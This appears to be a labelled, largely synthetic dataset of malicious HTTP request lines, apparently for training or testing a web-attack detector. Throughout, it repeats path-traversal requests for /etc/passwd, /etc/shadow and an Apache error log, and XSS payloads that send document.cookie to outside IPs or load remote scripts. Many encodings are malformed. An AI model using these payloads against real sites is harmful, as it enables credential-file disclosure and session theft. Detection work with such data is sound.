+49,1,200,4415,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,3574,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,3641,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,7749,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,5894,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,6003,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,6027,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,5677,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,3514,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,5712,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,3207,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,1101,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,1221,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,4058,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,5314,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,6902,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,6924,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+35,1,200,3734,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,4495,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,2013,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,1658,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,1795,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,5145,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,2850,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,2887,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,7625,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,1300,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,3002,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,5782,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+35,1,200,2317,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
+80,1,200,5382,8,30,16,6,2,GET /?file=<script>%window.open('http://22.53.33.116/328758')3C/script> HTTP/1.1
+84,1,200,1741,8,32,16,6,2,GET /?search=<script>%window.open('http://161.181.157.52/793879')3C/script> HTTP/1.1
+79,1,200,6323,7,28,17,6,2,GET /?p=<script><script+src="http://193.35.149.44/253638.js=></script> HTTP/1.1
+82,1,200,4195,7,33,17,6,2,GET /?search=<script><script+src="http://25.21.70.96/704010.js=></script> HTTP/1.1
+82,1,200,3269,7,33,17,6,2,GET /?search=<script><script+src="http://43.171.56.2/327778.js=></script> HTTP/1.1
+81,1,200,1531,8,30,16,6,2,GET /?name=<script>%window.open('http://176.37.17.143/990910')3C/script> HTTP/1.1
+102,1,200,5861,7,54,19,6,2,GET /?file=<script>window.location='http://231.117.234.126/?cookie='+document.cookie</script> HTTP/1.1
+82,1,200,3131,8,30,16,6,2,GET /?file=<script>%window.open('http://238.121.83.126/561843')3C/script> HTTP/1.1
+84,1,200,3661,7,33,17,6,2,GET /?search=<script><script+src="http://228.237.22.96/714175.js=></script> HTTP/1.1
+81,1,200,6179,7,31,17,6,2,GET /?name=<script><script+src="http://136.113.2.75/793520.js=></script> HTTP/1.1
+83,1,200,3795,7,40,14,5,2,GET /?search=<script>window.location.href="http://150.51.131.226"</script> HTTP/1.1
+82,1,200,4901,7,31,17,6,2,GET /?file=<script><script+src="http://106.205.39.60/275949.js=></script> HTTP/1.1
+102,1,200,6897,7,54,19,6,2,GET /?file=<script>window.location='http://245.227.247.224/?cookie='+document.cookie</script> HTTP/1.1
+102,1,200,7243,7,56,19,6,2,GET /?search=<script>window.location='http://169.92.225.65/?cookie='+document.cookie</script> HTTP/1.1
+75,1,200,1023,7,35,14,5,2,GET /?p=<script>window.location.href="http://92.95.9.126"</script> HTTP/1.1
+102,1,200,6061,7,56,19,6,2,GET /?search=<script>window.location='http://181.247.77.73/?cookie='+document.cookie</script> HTTP/1.1
+98,1,200,5946,7,51,19,6,2,GET /?p=<script>window.location='http://62.221.202.223/?cookie='+document.cookie</script> HTTP/1.1
+80,1,200,5274,7,38,14,5,2,GET /?name=<script>window.location.href="http://65.192.115.41"</script> HTTP/1.1
+96,1,200,7478,7,51,19,6,2,GET /?p=<script>window.location='http://63.226.30.69/?cookie='+document.cookie</script> HTTP/1.1
+78,1,200,6179,7,28,17,6,2,GET /?p=<script><script+src="http://128.46.178.1/762561.js=></script> HTTP/1.1
+50,1,200,1201,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,6621,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,1397,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,2363,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,5419,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,6375,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,4206,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,6505,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,5070,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,5841,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,2080,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,7642,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,2633,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,7634,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,1399,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,4280,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,4030,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,4510,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+50,1,200,1203,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
+99,1,200,5773,7,54,19,6,2,GET /?file=<script>window.location='http://239.41.40.53/?cookie='+document.cookie</script> HTTP/1.1
+61,1,200,2378,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,5983,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,3566,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,4993,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,2392,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,3723,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,7232,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,2680,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,4189,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,6943,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,2265,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,6328,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,7388,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,1338,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+61,1,200,2607,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
+99,1,200,5146,7,54,19,6,2,GET /?name=<script>window.location='http://99.233.31.62/?cookie='+document.cookie</script> HTTP/1.1
+81,1,200,6605,7,38,14,5,2,GET /?file=<script>window.location.href="http://253.146.246.47"</script> HTTP/1.1
+84,1,200,3811,8,32,16,6,2,GET /?search=<script>%window.open('http://30.148.200.228/195737')3C/script> HTTP/1.1
+77,1,200,2954,7,28,17,6,2,GET /?p=<script><script+src="http://91.63.242.75/76653.js=></script> HTTP/1.1
+81,1,200,6255,7,31,17,6,2,GET /?name=<script><script+src="http://9.185.46.186/834313.js=></script> HTTP/1.1
+103,1,200,6333,7,56,19,6,2,GET /?search=<script>window.location='http://128.105.27.164/?cookie='+document.cookie</script> HTTP/1.1
+82,1,200,1628,8,30,16,6,2,GET /?file=<script>%window.open('http://192.203.237.66/515086')3C/script> HTTP/1.1
+78,1,200,5966,8,27,16,6,2,GET /?p=<script>%window.open('http://164.36.241.15/836553')3C/script> HTTP/1.1
+48,1,200,6736,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,3161,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,1554,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,4579,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,6001,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,1268,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,5788,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,2624,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,7898,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,1112,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,4461,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+48,1,200,3372,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
+85,1,200,4683,8,32,16,6,2,GET /?search=<script>%window.open('http://170.149.248.169/153102')3C/script> HTTP/1.1
+80,1,200,1793,8,30,16,6,2,GET /?file=<script>%window.open('http://34.142.75.40/934954')3C/script> HTTP/1.1
+84,1,200,1742,8,32,16,6,2,GET /?search=<script>%window.open('http://204.246.236.55/649375')3C/script> HTTP/1.1
+78,1,200,7547,7,35,14,5,2,GET /?p=<script>window.location.href="http://84.135.222.165"</script> HTTP/1.1
+80,1,200,1480,8,30,16,6,2,GET /?file=<script>%window.open('http://81.94.84.250/288246')3C/script> HTTP/1.1
+79,1,200,7846,7,28,17,6,2,GET /?p=<script><script+src="http://63.221.62.161/703525.js=></script> HTTP/1.1
+100,1,200,1423,7,54,19,6,2,GET /?name=<script>window.location='http://250.3.104.235/?cookie='+document.cookie</script> HTTP/1.1
+97,1,200,6146,7,51,19,6,2,GET /?p=<script>window.location='http://9.237.205.181/?cookie='+document.cookie</script> HTTP/1.1
+78,1,200,7988,8,27,16,6,2,GET /?p=<script>%window.open('http://22.11.255.233/463688')3C/script> HTTP/1.1
+101,1,200,3589,7,54,19,6,2,GET /?name=<script>window.location='http://101.208.135.52/?cookie='+document.cookie</script> HTTP/1.1
+81,1,200,4220,7,38,14,5,2,GET /?name=<script>window.location.href="http://56.102.154.156"</script> HTTP/1.1
+81,1,200,6750,8,30,16,6,2,GET /?name=<script>%window.open('http://213.182.12.53/235998')3C/script> HTTP/1.1
+81,1,200,6780,8,30,16,6,2,GET /?name=<script>%window.open('http://224.45.94.168/142143')3C/script> HTTP/1.1
+79,1,200,2493,8,27,16,6,2,GET /?p=<script>%window.open('http://245.215.170.67/530499')3C/script> HTTP/1.1
+83,1,200,6612,7,40,14,5,2,GET /?search=<script>window.location.href="http://176.221.132.23"</script> HTTP/1.1
+101,1,200,3164,7,54,19,6,2,GET /?file=<script>window.location='http://92.113.117.169/?cookie='+document.cookie</script> HTTP/1.1
+80,1,200,5239,7,38,14,5,2,GET /?file=<script>window.location.href="http://169.188.82.86"</script> HTTP/1.1
+84,1,200,2657,7,31,17,6,2,GET /?name=<script><script+src="http://169.113.105.250/753240.js=></script> HTTP/1.1
+79,1,200,5960,7,28,17,6,2,GET /?p=<script><script+src="http://19.244.65.112/242655.js=></script> HTTP/1.1
+84,1,200,7790,8,32,16,6,2,GET /?search=<script>%window.open('http://141.132.210.90/536411')3C/script> HTTP/1.1
+80,1,200,4430,7,31,17,6,2,GET /?name=<script><script+src="http://37.134.67.53/45610.js=></script> HTTP/1.1
+80,1,200,7355,7,38,14,5,2,GET /?file=<script>window.location.href="http://181.44.76.242"</script> HTTP/1.1
+79,1,200,5502,7,35,14,5,2,GET /?p=<script>window.location.href="http://158.172.233.190"</script> HTTP/1.1
+79,1,200,2471,7,28,17,6,2,GET /?p=<script><script+src="http://33.214.186.67/312396.js=></script> HTTP/1.1
+79,1,200,1932,7,28,17,6,2,GET /?p=<script><script+src="http://235.141.217.6/858505.js=></script> HTTP/1.1
+78,1,200,2892,7,35,14,5,2,GET /?p=<script>window.location.href="http://234.254.42.170"</script> HTTP/1.1
+83,1,200,2424,7,31,17,6,2,GET /?file=<script><script+src="http://190.201.236.85/375019.js=></script> HTTP/1.1
+85,1,200,1343,7,33,17,6,2,GET /?search=<script><script+src="http://135.55.208.169/605848.js=></script> HTTP/1.1
+98,1,200,6371,7,51,19,6,2,GET /?p=<script>window.location='http://101.67.243.195/?cookie='+document.cookie</script> HTTP/1.1
+76,1,200,5185,7,35,14,5,2,GET /?p=<script>window.location.href="http://42.157.7.241"</script> HTTP/1.1
+80,1,200,5719,8,30,16,6,2,GET /?file=<script>%window.open('http://227.65.3.151/844724')3C/script> HTTP/1.1
+79,1,200,1498,8,27,16,6,2,GET /?p=<script>%window.open('http://138.43.159.209/292162')3C/script> HTTP/1.1
+85,1,200,5338,7,33,17,6,2,GET /?search=<script><script+src="http://112.224.119.59/130810.js=></script> HTTP/1.1
+80,1,200,4008,8,30,16,6,2,GET /?name=<script>%window.open('http://125.91.110.177/1354')3C/script> HTTP/1.1
+83,1,200,4423,7,33,17,6,2,GET /?search=<script><script+src="http://78.166.32.229/15447.js=></script> HTTP/1.1
+83,1,200,4071,8,32,16,6,2,GET /?search=<script>%window.open('http://100.105.86.64/173152')3C/script> HTTP/1.1
+82,1,200,7013,7,31,17,6,2,GET /?name=<script><script+src="http://218.100.89.28/237967.js=></script> HTTP/1.1
+48,1,200,7928,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,1126,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,1766,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,3948,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,5834,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,6656,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,3490,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,3560,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,5894,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+48,1,200,2014,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
+82,1,200,4207,7,40,14,5,2,GET /?search=<script>window.location.href="http://215.56.168.33"</script> HTTP/1.1
+100,1,200,5944,7,54,19,6,2,GET /?name=<script>window.location='http://167.223.2.103/?cookie='+document.cookie</script> HTTP/1.1
+77,1,200,5532,7,35,14,5,2,GET /?p=<script>window.location.href="http://214.161.11.56"</script> HTTP/1.1
+77,1,200,6665,7,35,14,5,2,GET /?p=<script>window.location.href="http://183.13.196.45"</script> HTTP/1.1
+80,1,200,3193,7,31,17,6,2,GET /?file=<script><script+src="http://97.31.201.3/267652.js=></script> HTTP/1.1
+79,1,200,2231,7,28,17,6,2,GET /?p=<script><script+src="http://22.172.133.244/83327.js=></script> HTTP/1.1
+80,1,200,6115,8,27,16,6,2,GET /?p=<script>%window.open('http://216.126.213.176/528352')3C/script> HTTP/1.1
+81,1,200,7244,7,31,17,6,2,GET /?file=<script><script+src="http://5.188.210.13/397101.js=></script> HTTP/1.1
+84,1,200,7024,7,33,17,6,2,GET /?search=<script><script+src="http://115.12.42.127/166286.js=></script> HTTP/1.1
+78,1,200,4270,7,38,14,5,2,GET /?name=<script>window.location.href="http://3.53.63.150"</script> HTTP/1.1
+81,1,200,6297,8,30,16,6,2,GET /?name=<script>%window.open('http://224.28.119.198/87647')3C/script> HTTP/1.1
+102,1,200,6145,7,56,19,6,2,GET /?search=<script>window.location='http://31.135.86.198/?cookie='+document.cookie</script> HTTP/1.1
+79,1,200,6168,7,28,17,6,2,GET /?p=<script><script+src="http://25.152.231.40/398698.js=></script> HTTP/1.1
+98,1,200,3082,7,51,19,6,2,GET /?p=<script>window.location='http://148.240.253.14/?cookie='+document.cookie</script> HTTP/1.1
+75,1,200,6917,7,35,14,5,2,GET /?p=<script>window.location.href="http://95.93.85.99"</script> HTTP/1.1
+83,1,200,1821,8,30,16,6,2,GET /?file=<script>%window.open('http://217.145.135.186/261092')3C/script> HTTP/1.1
+102,1,200,7502,7,54,19,6,2,GET /?name=<script>window.location='http://109.201.104.128/?cookie='+document.cookie</script> HTTP/1.1
+80,1,200,1505,8,27,16,6,2,GET /?p=<script>%window.open('http://133.162.206.127/550099')3C/script> HTTP/1.1
+97,1,200,4240,7,51,19,6,2,GET /?p=<script>window.location='http://98.18.101.208/?cookie='+document.cookie</script> HTTP/1.1
+83,1,200,5398,7,40,14,5,2,GET /?search=<script>window.location.href="http://138.144.20.161"</script> HTTP/1.1
+85,1,200,1287,7,33,17,6,2,GET /?search=<script><script+src="http://11.159.193.134/188444.js=></script> HTTP/1.1
+102,1,200,4676,7,54,19,6,2,GET /?file=<script>window.location='http://198.200.104.157/?cookie='+document.cookie</script> HTTP/1.1
+99,1,200,3748,7,51,19,6,2,GET /?p=<script>window.location='http://191.167.214.112/?cookie='+document.cookie</script> HTTP/1.1
+101,1,200,6794,7,56,19,6,2,GET /?search=<script>window.location='http://103.198.35.3/?cookie='+document.cookie</script> HTTP/1.1
+101,1,200,4304,7,54,19,6,2,GET /?name=<script>window.location='http://246.231.15.100/?cookie='+document.cookie</script> HTTP/1.1
+79,1,200,7389,8,27,16,6,2,GET /?p=<script>%window.open('http://219.58.245.253/996828')3C/script> HTTP/1.1
+97,1,200,3254,7,51,19,6,2,GET /?p=<script>window.location='http://41.145.163.21/?cookie='+document.cookie</script> HTTP/1.1
+78,1,200,4383,7,35,14,5,2,GET /?p=<script>window.location.href="http://125.239.26.190"</script> HTTP/1.1
+78,1,200,1320,7,38,14,5,2,GET /?file=<script>window.location.href="http://78.0.13.248"</script> HTTP/1.1
+83,1,200,3279,7,40,14,5,2,GET /?search=<script>window.location.href="http://138.241.65.101"</script> HTTP/1.1
+80,1,200,3492,7,28,17,6,2,GET /?p=<script><script+src="http://78.126.153.102/470896.js=></script> HTTP/1.1
+84,1,200,6066,8,32,16,6,2,GET /?search=<script>%window.open('http://138.39.234.126/883729')3C/script> HTTP/1.1
+80,1,200,2542,7,28,17,6,2,GET /?p=<script><script+src="http://222.182.154.41/877291.js=></script> HTTP/1.1
+83,1,200,5345,7,33,17,6,2,GET /?search=<script><script+src="http://247.61.64.192/72627.js=></script> HTTP/1.1
+78,1,200,2936,8,27,16,6,2,GET /?p=<script>%window.open('http://237.56.105.49/679860')3C/script> HTTP/1.1
+81,1,200,6402,7,38,14,5,2,GET /?name=<script>window.location.href="http://141.212.67.245"</script> HTTP/1.1
+81,1,200,2176,8,30,16,6,2,GET /?file=<script>%window.open('http://192.162.55.12/687877')3C/script> HTTP/1.1
+83,1,200,3162,7,33,17,6,2,GET /?search=<script><script+src="http://93.79.72.168/154200.js=></script> HTTP/1.1
+83,1,200,2715,8,32,16,6,2,GET /?search=<script>%window.open('http://243.245.58.86/673066')3C/script> HTTP/1.1
+84,1,200,6594,8,32,16,6,2,GET /?search=<script>%window.open('http://39.204.115.214/686899')3C/script> HTTP/1.1
+82,1,200,7628,8,30,16,6,2,GET /?name=<script>%window.open('http://185.176.113.52/237788')3C/script> HTTP/1.1
+100,1,200,5684,7,54,19,6,2,GET /?name=<script>window.location='http://30.207.246.91/?cookie='+document.cookie</script> HTTP/1.1
+80,1,200,3034,8,30,16,6,2,GET /?name=<script>%window.open('http://5.141.219.32/447558')3C/script> HTTP/1.1
+82,1,200,3929,7,40,14,5,2,GET /?search=<script>window.location.href="http://240.58.71.114"</script> HTTP/1.1
+97,1,200,4795,7,51,19,6,2,GET /?p=<script>window.location='http://170.185.141.9/?cookie='+document.cookie</script> HTTP/1.1
+80,1,200,2306,7,28,17,6,2,GET /?p=<script><script+src="http://160.99.173.178/270957.js=></script> HTTP/1.1
+85,1,200,1004,8,32,16,6,2,GET /?search=<script>%window.open('http://156.149.138.247/793612')3C/script> HTTP/1.1
+80,1,200,7598,7,28,17,6,2,GET /?p=<script><script+src="http://58.109.121.139/508858.js=></script> HTTP/1.1
+85,1,200,7526,7,33,17,6,2,GET /?search=<script><script+src="http://111.151.154.27/936806.js=></script> HTTP/1.1
+79,1,200,7662,8,27,16,6,2,GET /?p=<script>%window.open('http://144.248.117.183/28177')3C/script> HTTP/1.1
+82,1,200,6580,8,32,16,6,2,GET /?search=<script>%window.open('http://131.17.167.12/19755')3C/script> HTTP/1.1
+81,1,200,6251,7,38,14,5,2,GET /?name=<script>window.location.href="http://204.220.160.48"</script> HTTP/1.1
+83,1,200,6878,7,40,14,5,2,GET /?search=<script>window.location.href="http://214.210.228.42"</script> HTTP/1.1
+82,1,200,7416,8,30,16,6,2,GET /?file=<script>%window.open('http://216.243.100.71/686172')3C/script> HTTP/1.1
+81,1,200,1299,7,38,14,5,2,GET /?name=<script>window.location.href="http://149.202.75.192"</script> HTTP/1.1
+84,1,200,5342,7,33,17,6,2,GET /?search=<script><script+src="http://26.146.91.249/740225.js=></script> HTTP/1.1
+81,1,200,7002,7,38,14,5,2,GET /?file=<script>window.location.href="http://73.112.140.212"</script> HTTP/1.1
+99,1,200,7724,7,54,19,6,2,GET /?name=<script>window.location='http://0.132.223.32/?cookie='+document.cookie</script> HTTP/1.1
+100,1,200,4522,7,54,19,6,2,GET /?name=<script>window.location='http://81.114.152.72/?cookie='+document.cookie</script> HTTP/1.1
+98,1,200,5360,7,51,19,6,2,GET /?p=<script>window.location='http://255.165.74.154/?cookie='+document.cookie</script> HTTP/1.1
+83,1,200,3606,8,30,16,6,2,GET /?file=<script>%window.open('http://247.174.181.149/600627')3C/script> HTTP/1.1
+81,1,200,4012,7,31,17,6,2,GET /?name=<script><script+src="http://78.225.181.204/4140.js=></script> HTTP/1.1
+100,1,200,1060,7,54,19,6,2,GET /?name=<script>window.location='http://137.50.66.156/?cookie='+document.cookie</script> HTTP/1.1
+83,1,200,5709,7,40,14,5,2,GET /?search=<script>window.location.href="http://19.211.216.121"</script> HTTP/1.1
+82,1,200,2797,7,40,14,5,2,GET /?search=<script>window.location.href="http://151.206.1.132"</script> HTTP/1.1
+97,1,200,5885,7,51,19,6,2,GET /?p=<script>window.location='http://5.228.200.193/?cookie='+document.cookie</script> HTTP/1.1
+79,1,200,7043,8,30,16,6,2,GET /?name=<script>%window.open('http://56.88.74.12/914818')3C/script> HTTP/1.1
+82,1,200,6169,8,30,16,6,2,GET /?file=<script>%window.open('http://153.212.91.157/286788')3C/script> HTTP/1.1
+78,1,200,4558,8,30,16,6,2,GET /?name=<script>%window.open('http://19.2.4.162/615563')3C/script> HTTP/1.1
+79,1,200,6946,7,35,14,5,2,GET /?p=<script>window.location.href="http://166.204.252.186"</script> HTTP/1.1
+82,1,200,2892,7,31,17,6,2,GET /?name=<script><script+src="http://72.205.255.93/842497.js=></script> HTTP/1.1
+80,1,200,1333,7,28,17,6,2,GET /?p=<script><script+src="http://177.237.34.123/563467.js=></script> HTTP/1.1
+100,1,200,7573,7,54,19,6,2,GET /?name=<script>window.location='http://152.176.21.72/?cookie='+document.cookie</script> HTTP/1.1
+101,1,200,1310,7,56,19,6,2,GET /?search=<script>window.location='http://3.154.203.76/?cookie='+document.cookie</script> HTTP/1.1
+79,1,200,1540,7,31,17,6,2,GET /?file=<script><script+src="http://235.9.2.66/366961.js=></script> HTTP/1.1
+81,1,200,1154,7,38,14,5,2,GET /?name=<script>window.location.href="http://48.245.234.223"</script> HTTP/1.1
+81,1,200,7819,7,31,17,6,2,GET /?file=<script><script+src="http://130.98.89.42/672217.js=></script> HTTP/1.1
+80,1,200,7138,7,28,17,6,2,GET /?p=<script><script+src="http://164.166.25.219/230750.js=></script> HTTP/1.1
+81,1,200,7669,7,38,14,5,2,GET /?file=<script>window.location.href="http://139.231.186.92"</script> HTTP/1.1
+82,1,200,7554,8,30,16,6,2,GET /?file=<script>%window.open('http://69.242.152.118/149608')3C/script> HTTP/1.1
+77,1,200,2464,8,27,16,6,2,GET /?p=<script>%window.open('http://217.71.121.66/96431')3C/script> HTTP/1.1
+83,1,200,6874,7,31,17,6,2,GET /?file=<script><script+src="http://114.215.24.236/152913.js=></script> HTTP/1.1
+84,1,200,6158,7,33,17,6,2,GET /?search=<script><script+src="http://152.217.40.132/78232.js=></script> HTTP/1.1
+102,1,200,2265,7,56,19,6,2,GET /?search=<script>window.location='http://166.80.82.100/?cookie='+document.cookie</script> HTTP/1.1
+79,1,200,4955,8,27,16,6,2,GET /?p=<script>%window.open('http://148.146.88.188/461524')3C/script> HTTP/1.1
+80,1,200,4285,7,38,14,5,2,GET /?name=<script>window.location.href="http://71.28.104.158"</script> HTTP/1.1
+82,1,200,6807,7,38,14,5,2,GET /?file=<script>window.location.href="http://162.141.128.105"</script> HTTP/1.1
+85,1,200,6072,8,32,16,6,2,GET /?search=<script>%window.open('http://244.254.163.138/623504')3C/script> HTTP/1.1
+83,1,200,7095,8,30,16,6,2,GET /?name=<script>%window.open('http://110.156.209.200/464198')3C/script> HTTP/1.1
+85,1,200,5514,7,33,17,6,2,GET /?search=<script><script+src="http://84.246.234.132/135438.js=></script> HTTP/1.1
+100,1,200,7114,7,54,19,6,2,GET /?name=<script>window.location='http://200.36.14.247/?cookie='+document.cookie</script> HTTP/1.1
+101,1,200,5908,7,54,19,6,2,GET /?file=<script>window.location='http://238.88.220.218/?cookie='+document.cookie</script> HTTP/1.1
+79,1,200,6379,7,38,14,5,2,GET /?file=<script>window.location.href="http://2.166.159.37"</script> HTTP/1.1
+82,1,200,2148,8,32,16,6,2,GET /?search=<script>%window.open('http://183.71.214.3/179346')3C/script> HTTP/1.1
+79,1,200,5277,8,27,16,6,2,GET /?p=<script>%window.open('http://147.113.83.172/881346')3C/script> HTTP/1.1
+99,1,200,5329,7,54,19,6,2,GET /?file=<script>window.location='http://118.26.61.70/?cookie='+document.cookie</script> HTTP/1.1
+99,1,200,6231,7,54,19,6,2,GET /?file=<script>window.location='http://234.89.44.61/?cookie='+document.cookie</script> HTTP/1.1
+101,1,200,6547,7,54,19,6,2,GET /?file=<script>window.location='http://200.28.155.120/?cookie='+document.cookie</script> HTTP/1.1
+99,1,200,7753,7,56,19,6,2,GET /?search=<script>window.location='http://243.54.0.8/?cookie='+document.cookie</script> HTTP/1.1
+81,1,200,5004,8,30,16,6,2,GET /?name=<script>%window.open('http://116.210.120.39/60449')3C/script> HTTP/1.1
+97,1,200,1752,7,51,19,6,2,GET /?p=<script>window.location='http://66.185.252.46/?cookie='+document.cookie</script> HTTP/1.1
+76,1,200,5307,8,27,16,6,2,GET /?p=<script>%window.open('http://48.38.44.98/782201')3C/script> HTTP/1.1
+80,1,200,5181,7,38,14,5,2,GET /?name=<script>window.location.href="http://120.96.98.113"</script> HTTP/1.1
+75,1,200,4807,8,27,16,6,2,GET /?p=<script>%window.open('http://116.44.4.7/170587')3C/script> HTTP/1.1
+98,1,200,5102,7,51,19,6,2,GET /?p=<script>window.location='http://134.70.214.164/?cookie='+document.cookie</script> HTTP/1.1
+104,1,200,4214,7,56,19,6,2,GET /?search=<script>window.location='http://143.222.121.204/?cookie='+document.cookie</script> HTTP/1.1
+84,1,200,7201,7,33,17,6,2,GET /?search=<script><script+src="http://77.205.119.89/218732.js=></script> HTTP/1.1
+79,1,200,7307,7,38,14,5,2,GET /?file=<script>window.location.href="http://46.67.166.53"</script> HTTP/1.1
+102,1,200,6451,7,56,19,6,2,GET /?search=<script>window.location='http://139.110.90.60/?cookie='+document.cookie</script> HTTP/1.1
+101,1,200,4148,7,54,19,6,2,GET /?name=<script>window.location='http://160.48.181.180/?cookie='+document.cookie</script> HTTP/1.1
+78,1,200,1700,7,35,14,5,2,GET /?p=<script>window.location.href="http://131.150.67.213"</script> HTTP/1.1
+81,1,200,3249,7,40,14,5,2,GET /?search=<script>window.location.href="http://25.135.1.154"</script> HTTP/1.1
